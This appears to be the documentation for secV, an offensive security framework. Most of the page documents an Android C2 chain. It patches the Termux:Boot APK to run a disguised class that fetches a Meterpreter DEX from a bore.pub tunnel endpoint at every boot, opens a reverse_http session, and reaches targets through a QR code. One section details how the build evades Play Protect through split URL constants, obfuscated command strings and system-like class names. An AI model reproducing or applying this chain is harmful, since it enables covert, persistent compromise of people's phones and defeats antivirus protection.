secV
Documentation

secV is a modular offensive security framework built around a Go REPL shell and Python-driven modules. Each module is a self-contained tool that receives targets and parameters over stdin and returns structured findings over stdout. The shell handles dispatch, tab-completion, session tracking, and live module reloading.

Install git clone https://github.com/secvulnhub/secV && cd secV && bash install.sh

How It Works

Architecture

secV is split into two layers: a Go REPL shell that handles all user interaction, and Python (or Bash) modules that do the actual work. The shell never embeds tool-specific logic - it only knows how to load modules, manage parameters, and route stdin/stdout. This keeps the binary small (~4 MB) and makes adding new modules as simple as dropping a Python file into the right directory.

01
Module Discovery
At startup the shell walks tools/ and loads every module.json it finds. Each JSON file declares the module's name, description, entry-point binary, accepted parameters, and required dependencies. The shell never executes anything until run is called.
02
Parameter Model
Every value the user sets with set is stored in the shell's in-memory param map. When run is called the shell serialises the map plus the target into a single JSON object and writes it to the module's stdin. The module reads one line, parses it, and proceeds.
03
Output Contract
Modules write UTF-8 lines to stdout. Lines that start with FINDING: are parsed as JSON findings. Lines starting with LOG: become log entries. Everything else is streamed directly to the terminal as progress output. When the process exits the shell collects all findings and renders a summary table.
04
Session Tracking
The shell maintains a live session registry. Meterpreter sessions opened through android_pentest are tracked by PID and metadata. Use sessions list to view, sessions interact <id> to drop into a session, or sessions kill <id> to terminate it.

Directory Layout

The repository follows a consistent structure. The Go shell binary lives at the root. All modules live under tools/, grouped by category. Each module folder contains a module.json and one or more Python scripts.

Code Deep Dive

Internals

This section explains how the key pieces of secV work at the code level. It is intended for people who want to understand, extend, or audit the framework - not just use it.

The REPL Loop (main.go)

The shell is a standard Go read-eval-print loop. On each iteration it prints a prompt, reads a line, tokenises it, and dispatches to a handler. The prompt is built dynamically: it shows the loaded module name and the count of currently-set parameters so you always know your context at a glance. 

// Simplified prompt construction - actual code in main.go
func buildPrompt(mod *Module, params map[string]string) string {
    if mod == nil {
        return "secV ❯ "
    }
    op := params["operation"]
    n  := len(params)
    if op != "" {
        return fmt.Sprintf("secV %s › %s [%d params] ❯ ", mod.Name, op, n)
    }
    return fmt.Sprintf("secV %s ❯ ", mod.Name)
}

Built-in commands (use, set, run, back etc.) are matched first. If no built-in matches, the shell checks whether the first token is a Linux binary (via exec.LookPath) and executes it as a subprocess - this is how native Linux commands like ls, cat, and grep work natively from inside secV without any special handling.

Module Loading (module.json)

Every module directory contains a module.json that the shell reads at startup (and on reload). The JSON defines everything the shell needs to know about the module - no code is executed at load time. 

// Example module.json (android_pentest, abbreviated)
{
  "name":        "android_pentest",
  "version":     "2.0",
  "description": "Android security testing suite",
  "entry":       "android_pentest.py",    // script the shell invokes
  "author":      "0xb0rn3",
  "parameters": {
    "operation": {
      "type":     "string",
      "required": true,
      "options":  ["recon", "static_analysis", "backdoor_apk", "rebuild", ...],
      "help":     "Operation to perform"
    },
    "msf": {
      "type":     "boolean",
      "required": false,
      "default":  false,
      "help":     "Inject DexClassLoader Meterpreter payload"
    }
    // ... more params
  },
  "dependencies": ["adb", "apktool", "java", "msfvenom"]
}

When the user runs use android_pentest the shell reads this JSON, builds the tab-completion candidates from the parameters map and each parameter's options list, and checks whether all dependencies are on PATH. Nothing is executed yet.

The stdin/stdout Protocol

When the user calls run <target> the shell spawns the entry-point script as a subprocess, writes a single JSON line to its stdin, and then streams the subprocess's stdout directly to the terminal. The module reads the JSON, executes the requested operation, and emits findings.

How a Python Module Receives Data

Every Python module starts with the same boilerplate: read one JSON line from stdin, extract target and params, dispatch to the requested operation, and print findings. The findings are plain Python dictionaries serialised to JSON and prefixed with FINDING:. 

import json, sys

# Read the shell's dispatch payload
data   = json.loads(sys.stdin.readline())
target = data.get("target", "")
params = data.get("params", {})
op     = params.get("operation", "recon")

# Dispatch table - each operation is its own method
ops = {
    "recon":          self._recon_operation,
    "static_analysis": self._static_analysis_operation,
    "backdoor_apk":   self._backdoor_apk_operation,
    "rebuild":         self._rebuild_apk_operation,
}

handler = ops.get(op)
if handler:
    handler()
else:
    print(f"[!] Unknown operation: {op}")

# Emit all collected findings
for f in self.findings:
    print(f"FINDING: {json.dumps(f)}")

Operation Dispatch in android_pentest

android_pentest.py exposes 26 operations, each mapped to a private method. Operations are grouped by purpose - recon, analysis, exploitation, persistence, and delivery. The method naming convention is always _<operation_name>_operation(self). All shared state (device info, findings list, errors, log lines) lives on the AndroidPentest class instance.

The ADB Bridge

Most android_pentest operations route through the same internal ADB helper. It wraps subprocess.run(["adb", ...], capture_output=True) and parses the output. Device discovery runs automatically before any operation that requires a connected device - if no device is found, the operation fails with a clear error rather than silently producing garbage output. 

def _adb(self, *args) -> subprocess.CompletedProcess:
    cmd = ["adb"]
    if self.device_serial:
        cmd += ["-s", self.device_serial]
    cmd += list(args)
    return subprocess.run(cmd, capture_output=True, text=True, timeout=30)

def _shell(self, *cmd) -> str:
    r = self._adb("shell", *cmd)
    return r.stdout.strip()

# Usage inside an operation:
arch = self._shell("getprop ro.product.cpu.abi")
sdk  = self._shell("getprop ro.build.version.sdk")

Android C2

C2 Stack & APK Persistence

The Android persistence chain is the most technically complex part of secV. It uses several layered techniques to achieve boot-persistent Meterpreter sessions over WAN without embedding any detectable payload statically in the APK. This section documents every component of that chain - what it does, why it works, and how each piece connects to the next.

Design goal: The rebuilt APK must pass Play Protect static analysis, survive a device reboot, fetch the real Meterpreter payload from a WAN endpoint without storing it on disk permanently, and open a session through carrier NAT.

The Four-Layer Chain

01
Termux:Boot → BOOT_COMPLETED receiver
The legitimate Termux:Boot APK is patched by build_bootbuddy.py. The BootReceiver.onReceive() smali is modified to call startForegroundService(AgentService) immediately on BOOT_COMPLETED. The exported="true" flag is also set - required on Android 11+ for the broadcast to be delivered. A foreground service is necessary from API 26+ because background service starts from broadcast receivers are blocked.
02
AgentService → foreground service context
AgentService.smali is injected into the APK. Its onStartCommand() creates a notification channel ("secv"), calls startForeground() to satisfy API 28+ foreground-service requirements, then invokes BootReceiver.launchAgent() (which starts the secV agent script from disk) and Payload.start(context) (which kicks off the DexClassLoader chain in a daemon thread). Running inside a Service gives the payload a long-lived Android context - critical because BroadcastReceivers are killed after ~10 seconds.
03
DexClassLoader Payload → runtime DEX fetch
com.android.system.health.Payload is injected as a smali file by gen_dexloader_smali(). Its run() method opens a URL connection to http://bore.pub:21062/s.dex (the URL is split across two string constants to avoid a single suspicious literal), writes the bytes to getCodeCacheDir()/s.dex, then loads it with DexClassLoader and calls com.metasploit.stage.Payload.start(context) via reflection. On failure it sleeps 5 seconds and retries indefinitely - the session opens as soon as the device gets network after boot. No Meterpreter code is ever present in the APK itself.
04
s.dex → reverse_http Meterpreter via bore tunnel
s.dex is generated by gen_sdex() using msfvenom -p android/meterpreter/reverse_http targeting bore.pub:37993 (the bore MSF tunnel). reverse_http is chosen over reverse_tcp because HTTP traffic survives carrier NAT and DPI more reliably on mobile networks. The bore tunnel at bore.pub:37993 forwards to localhost:4444 on the attacker machine where msfconsole (or the watchdog-managed handler) is listening.

c2_watchdog.sh - The Stack Manager

c2_watchdog.sh manages four processes simultaneously and restarts any that die. It is the single command needed on the attacker machine to bring up the entire C2 stack.

APK Delivery via QR

After build_bootbuddy.py finishes building, it automatically generates a QR code encoding the WAN APK URL http://bore.pub:21062/rebuilt.apk. The APK is served by the same DEX HTTP server that the watchdog manages - the output/ directory contains both files. Once the watchdog is running, the target device only needs to scan the QR code with any camera app, open the link, and install the APK. ADB is not required.

Play Protect Evasion

Several specific decisions in the build chain exist to evade Play Protect and on-device antivirus. These are worth understanding if you are tuning the chain or debugging detection issues.

A
No static Meterpreter in APK
The APK contains only the DexClassLoader fetcher - not the Meterpreter itself. Play Protect's static DEX scanner finds nothing to flag because there are no Metasploit signatures in the installed package. The real payload (s.dex) is fetched at runtime and written to getCodeCacheDir() which is not scanned by Play Protect during boot.
B
URL split across two string constants
The smali for the DEX fetch URL is const-string v0, "http://bore" + const-string v1, ".pub:21062/s.dex" concatenated at runtime. A single http://bore.pub:21062/s.dex constant would be trivially flagged by string-matching scanners.
C
ProcessBuilder + split command string in launchAgent()
The boot script launcher uses ProcessBuilder (less heuristically flagged than Runtime.exec()) and splits the shell command string at the midpoint so no single suspicious string constant is visible to static analysis. The halves are concatenated at runtime via String.concat().
D
Disguised class names
The DexClassLoader injected class is placed at com.android.system.health.Payload - a path that resembles a legitimate Android system health service. AgentService lives at com.termux.boot.AgentService - part of the Termux:Boot package namespace, indistinguishable from a real Termux component.

Getting Started

Quickstart

01
Install secV
Clone the repo and run the install script. It detects your distro, installs missing dependencies, compiles the Go binary, and makes all module scripts executable.
git clone https://github.com/secvulnhub/secV
cd secV
bash install.sh

Launch the shell
Run the secV binary. It auto-scans tools/ and loads all modules with tab-completion.
./secV        # from repo directory
secV          # if installed system-wide (install.sh option)

Network recon
Scan a subnet, enumerate hosts, map open ports, detect device types, and pull live CVEs from NVD.
use netrecon
set mode deep
set threads 30
run 192.168.1.0/24

Android WAN C2 (boot persistence)
Patch Termux:Boot, generate s.dex, get QR for delivery. Device connects back on every reboot via bore tunnels.
